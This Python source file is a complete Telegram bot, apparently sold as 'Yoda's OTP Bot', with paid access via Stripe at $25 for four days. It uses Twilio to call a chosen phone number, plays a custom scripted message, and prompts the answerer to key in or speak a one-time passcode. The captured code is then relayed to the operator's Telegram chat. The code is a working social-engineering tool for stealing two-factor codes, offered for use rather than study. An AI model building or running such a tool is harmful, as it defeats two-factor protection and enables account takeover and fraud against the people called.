# otp.py
import os
import asyncio
import threading
import logging
from datetime import datetime, timedelta, timezone
from urllib.parse import quote
import json

from flask import Flask, request, Response
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler,
    ContextTypes, MessageHandler, filters
)
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse, Gather
import stripe

logging.basicConfig(level=logging.INFO)
log = logging.getLogger("otp")

# -------------------------
# Config / Secrets
# -------------------------
PORT = int(os.environ.get("PORT", 5000))
RENDER_EXTERNAL_URL = os.environ.get("RENDER_EXTERNAL_URL")
PUBLIC_BASE_URL = os.environ.get("NGROK_URL") or RENDER_EXTERNAL_URL

TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN") or "YOUR_TELEGRAM_TOKEN"

TWILIO_ACCOUNT_SID = os.environ.get("TWILIO_ACCOUNT_SID") or "YOUR_TWILIO_SID"
TWILIO_AUTH_TOKEN = os.environ.get("TWILIO_AUTH_TOKEN") or "YOUR_TWILIO_AUTH_TOKEN"
TWILIO_PHONE_NUMBER = os.environ.get("TWILIO_PHONE_NUMBER") or "+1234567890"
twilio_client = Client(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)

STRIPE_SECRET_KEY = os.environ.get("STRIPE_SECRET_KEY") or "YOUR_STRIPE_SK"
stripe.api_key = STRIPE_SECRET_KEY

if not PUBLIC_BASE_URL:
    log.warning("PUBLIC_BASE_URL is not set. Set RENDER_EXTERNAL_URL or NGROK_URL.")

# -------------------------
# State storage
# -------------------------
user_phone = {}
phone_to_chat = {}
captured_otp = {}
last_message = {}
PAID_USERS_FILE = "paid_users.json"

# Load paid users from JSON
def load_paid_users():
    global paid_users
    try:
        with open(PAID_USERS_FILE, "r") as f:
            data = json.load(f)
        paid_users = {int(k): datetime.fromisoformat(v) for k, v in data.items()}
        log.info("Loaded paid users from JSON")
    except FileNotFoundError:
        log.warning("paid_users.json not found. Starting with default seeded user.")
        # Seeded user
        paid_users = {6910149689: datetime.now(timezone.utc) + timedelta(days=4)}
        save_paid_users()

def save_paid_users():
    with open(PAID_USERS_FILE, "w") as f:
        json.dump({str(k): v.isoformat() for k, v in paid_users.items()}, f, indent=2)

load_paid_users()

# -------------------------
# Helpers
# -------------------------
def is_paid(user_id: int) -> bool:
    return user_id in paid_users and datetime.now(timezone.utc) < paid_users[user_id]

def get_main_keyboard(user_id: int) -> InlineKeyboardMarkup:
    keyboard = [
        [InlineKeyboardButton("📱 Set Phone", callback_data="setphone")],
        [InlineKeyboardButton("ℹ️ Help / Usage", callback_data="help")]
    ]
    if not is_paid(user_id):
        keyboard.insert(1, [InlineKeyboardButton("💳 Pay $25 / 4 Days", callback_data="pay")])
    if user_id in user_phone:
        keyboard[0].append(InlineKeyboardButton("📞 Make Call", callback_data="call"))
    return InlineKeyboardMarkup(keyboard)

def create_checkout_session(user_id: int, customer_email: str | None = None) -> str:
    if not PUBLIC_BASE_URL:
        raise RuntimeError("PUBLIC_BASE_URL is not set; cannot create Stripe success/cancel URLs.")
    session = stripe.checkout.Session.create(
        payment_method_types=["card"],
        line_items=[{
            "price_data": {
                "currency": "usd",
                "product_data": {"name": "4-Day Survivor Access"},
                "unit_amount": 2500,
            },
            "quantity": 1,
        }],
        mode="payment",
        customer_email=customer_email,
        success_url=f"{PUBLIC_BASE_URL}/success?user_id={user_id}",
        cancel_url=f"{PUBLIC_BASE_URL}/cancel"
    )
    return session.url

# -------------------------
# Telegram Bot
# -------------------------
application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Welcome to Yoda's OTP Bot!\n\nUse the buttons below:",
        reply_markup=get_main_keyboard(update.effective_user.id)
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id if update.effective_chat else (
        update.callback_query.message.chat.id if update.callback_query else None
    )
    if update.callback_query:
        await update.callback_query.answer()
    if chat_id:
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                "ℹ️ *How to use this bot:*\n\n"
                "1. Tap *📱 Set Phone* to save your number.\n"
                "2. Tap *📞 Make Call* and enter your custom message.\n"
                "3. The bot will call you and capture the OTP.\n"
                "4. You’ll get the OTP back in this chat ✅"
            ),
            parse_mode="Markdown",
            reply_markup=get_main_keyboard(update.effective_user.id)
        )

async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id

    if query.data == "pay":
        try:
            checkout_url = create_checkout_session(user_id=uid)
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"💳 Complete payment here: {checkout_url}")
        except Exception as e:
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"❌ Could not start checkout: {e}")
        return

    if query.data in ["setphone", "call"] and not is_paid(uid):
        await context.bot.send_message(chat_id=update.effective_chat.id, text="💰 You must pay $25 for 4 days to use this feature.")
        return

    if query.data == "setphone":
        keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ Back to Menu", callback_data="menu")]])
        await query.edit_message_text("📱 Please send me your phone number in the format: `+1XXXXXXXXXX`", parse_mode="Markdown", reply_markup=keyboard)
        context.user_data["awaiting_phone"] = True

    elif query.data == "call":
        if uid not in user_phone:
            await query.edit_message_text("⚠️ Please set your phone first with 📱 Set Phone.", reply_markup=get_main_keyboard(uid))
        else:
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("↩️ Back to Menu", callback_data="menu")],
                [InlineKeyboardButton("ℹ️ Info / Usage", callback_data="help")]
            ])
            await query.edit_message_text("📞 Send me your custom message for the call.\n\nOr type `/call` to reuse your last message.", reply_markup=keyboard)
            context.user_data["awaiting_message"] = True

    elif query.data == "help":
        await help_command(update, context)

    elif query.data == "menu":
        await query.edit_message_text("Main Menu:", reply_markup=get_main_keyboard(uid))

async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = (update.message.text or "").strip()

    if not is_paid(uid):
        await update.message.reply_text("💰 You must pay $25 for 4 days to use this feature.")
        return

    if context.user_data.get("awaiting_phone"):
        user_phone[uid] = text
        phone_to_chat[text] = update.effective_chat.id
        context.user_data["awaiting_phone"] = False
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("📞 Make Call", callback_data="call")],
            [InlineKeyboardButton("↩️ Back to Menu", callback_data="menu")],
            [InlineKeyboardButton("ℹ️ Info / Usage", callback_data="help")]
        ])
        await update.message.reply_text(f"✅ Phone number saved: {text}\nChoose an option below:", reply_markup=keyboard)
        return

    if context.user_data.get("awaiting_message"):
        last_message[uid] = text
        context.user_data["awaiting_message"] = False
        phone = user_phone[uid]
        base = PUBLIC_BASE_URL
        if not base:
            await update.message.reply_text("❌ Server URL not configured. Set RENDER_EXTERNAL_URL.")
            return
        twilio_client.calls.create(
            to=phone,
            from_=TWILIO_PHONE_NUMBER,
            url=f"{base}/voice?msg={quote(text)}",
            status_callback=f"{base}/call_status",
            status_callback_event=['initiated', 'ringing', 'answered', 'completed', 'no-answer'],
            status_callback_method='POST'
        )
        await update.message.reply_text(f"📞 Calling {phone} now with your message...")
        return

    if text == "/call":
        if uid not in last_message:
            await update.message.reply_text("⚠️ No previous message found. Please send a new one.")
            return
        phone = user_phone.get(uid)
        if not phone:
            await update.message.reply_text("⚠️ Please set your phone first with 📱 Set Phone.")
            return
        base = PUBLIC_BASE_URL
        if not base:
            await update.message.reply_text("❌ Server URL not configured. Set RENDER_EXTERNAL_URL.")
            return
        twilio_client.calls.create(
            to=phone,
            from_=TWILIO_PHONE_NUMBER,
            url=f"{base}/voice?msg={quote(last_message[uid])}",
            status_callback=f"{base}/call_status",
            status_callback_event=['initiated', 'ringing', 'answered', 'completed', 'no-answer'],
            status_callback_method='POST'
        )
        await update.message.reply_text(f"📞 Re-calling {phone} with your last message...")

# Register handlers
application.add_handler(CommandHandler("start", start))
application.add_handler(CallbackQueryHandler(handle_buttons))
application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

# -------------------------
# Flask server
# -------------------------
flask_app = Flask(__name__)

@flask_app.route("/", methods=["GET"])
def root():
    return "OK", 200

@flask_app.route(f"/{TELEGRAM_TOKEN}", methods=["POST"])
def telegram_webhook():
    try:
        data = request.get_json(force=True, silent=True)
        if not data:
            return "no json", 200
        update = Update.de_json(data, application.bot)
        fut = asyncio.run_coroutine_threadsafe(application.process_update(update), bot_loop)
        fut.result(timeout=10)
        return "OK", 200
    except Exception as e:
        log.exception("webhook error: %s", e)
        return "OK", 200

# -------------------------
# Voice / OTP capture
# -------------------------
@flask_app.route("/voice", methods=["POST", "GET"])
def voice():
    message = request.args.get("msg", "Please enter your OTP now.")
    resp = VoiceResponse()
    gather = Gather(input="dtmf speech", timeout=10, num_digits=6,
                    action=f"{PUBLIC_BASE_URL}/capture", method="POST")
    gather.say(message)
    gather.say("Now, please enter or speak your OTP.")
    resp.append(gather)
    resp.say("No input received. Goodbye!")
    return Response(str(resp), mimetype="text/xml")

@flask_app.route("/capture", methods=["POST"])
def capture():
    otp = request.values.get("Digits") or request.values.get("SpeechResult")
    to_number = request.values.get("To")
    log.info("Twilio /capture To=%s OTP=%s Recording=%s", to_number, otp, request.values.get("RecordingUrl"))

    if to_number and otp:
        captured_otp[to_number] = otp
        chat_id = phone_to_chat.get(to_number)
        if chat_id:
            user_id = next((k for k, v in user_phone.items() if v == to_number), None)
            if user_id:
                try:
                    fut = asyncio.run_coroutine_threadsafe(
                        application.bot.send_message(chat_id=chat_id, text=f"📩 Captured OTP: {otp}"),
                        bot_loop
                    )
                    fut.result(timeout=5)
                    fut = asyncio.run_coroutine_threadsafe(
                        application.bot.send_message(chat_id=chat_id, text="Main Menu:", reply_markup=get_main_keyboard(user_id)),
                        bot_loop
                    )
                    fut.result(timeout=5)
                except Exception:
                    log.exception("Failed to send OTP or menu to Telegram")

    resp = VoiceResponse()
    resp.say("Thanks! Your OTP has been captured. Goodbye!")
    return Response(str(resp), mimetype="text/xml")

@flask_app.route("/call_status", methods=["POST"])
def call_status():
    call_status_val = request.values.get("CallStatus")
    to_number = request.values.get("To")
    chat_id = phone_to_chat.get(to_number)
    log.info("Call status %s for %s", call_status_val, to_number)

    if chat_id:
        status_map = {
            "initiated": "📞 Call has been initiated.",
            "ringing": "📲 Call is ringing.",
            "answered": "✅ Call was picked up.",
            "completed": "📴 Call has ended.",
            "no-answer": "❌ Call was not answered."
        }
        msg = status_map.get(call_status_val, f"ℹ️ Call status: {call_status_val}")
        try:
            fut = asyncio.run_coroutine_threadsafe(application.bot.send_message(chat_id=chat_id, text=msg), bot_loop)
            fut.result(timeout=5)
            if call_status_val == "completed":
                user_id = next((k for k, v in user_phone.items() if v == to_number), None)
                if user_id:
                    fut = asyncio.run_coroutine_threadsafe(
                        application.bot.send_message(chat_id=chat_id, text="Main Menu:", reply_markup=get_main_keyboard(user_id)),
                        bot_loop
                    )
                    fut.result(timeout=5)
        except Exception:
            log.exception("Failed to send call status or menu to Telegram")
    return ("", 204)

# -------------------------
# Payment
# -------------------------
@flask_app.route("/success")
def payment_success():
    user_id = request.args.get("user_id")
    if not user_id:
        return "Error: user ID not found."
    user_id = int(user_id)
    paid_users[user_id] = datetime.now(timezone.utc) + timedelta(days=4)
    save_paid_users()
    return f"✅ Payment received! User {user_id} now has access for 4 days."

@flask_app.route("/cancel")
def payment_cancel():
    return "Payment canceled. You do not have access."

# -------------------------
# Bot loop thread
# -------------------------
def bot_loop_thread():
    global bot_loop
    bot_loop = asyncio.new_event_loop()
    asyncio.set_event_loop(bot_loop)

    async def _startup():
        await application.initialize()
        await application.start()
        try:
            if PUBLIC_BASE_URL:
                url = f"{PUBLIC_BASE_URL}/{TELEGRAM_TOKEN}"
                await application.bot.set_webhook(url)
                log.info("Webhook set to %s", url)
            else:
                log.warning("PUBLIC_BASE_URL not set; skipping auto set_webhook.")
        except Exception:
            log.exception("Failed to set webhook")

    bot_loop.run_until_complete(_startup())
    log.info("Bot loop running.")
    bot_loop.run_forever()

# Start bot loop
bot_loop = None
t = threading.Thread(target=bot_loop_thread, name="bot-loop", daemon=True)
t.start()

# -------------------------
# Main Flask
# -------------------------
if __name__ == "__main__":
    log.info("Starting Flask on port %s", PORT)
    flask_app.run(host="0.0.0.0", port=PORT)
